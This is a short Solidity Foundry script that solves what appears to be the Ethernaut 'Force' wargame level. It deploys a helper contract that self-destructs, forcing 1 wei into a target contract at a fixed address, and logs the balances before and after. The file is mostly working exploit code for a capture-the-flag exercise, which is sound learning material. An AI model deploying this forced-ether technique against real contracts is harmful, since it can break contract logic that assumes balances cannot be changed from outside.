// SDPX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/7_Force.sol";

contract ToBeDestructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}


contract POC is Script {
    Force public target;

    function setUp() external {
        target = Force(0x99d146c7b5eaAd827A240746B5577027B879D297);
    }

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        uint256 balance = address(target).balance;
        console.log("before balance: ", balance);

        new ToBeDestructed{value : 1 wei}(payable(address(target)));

        balance = address(target).balance;
        console.log("after  balance: ", balance);

        vm.stopBroadcast();
    }
}
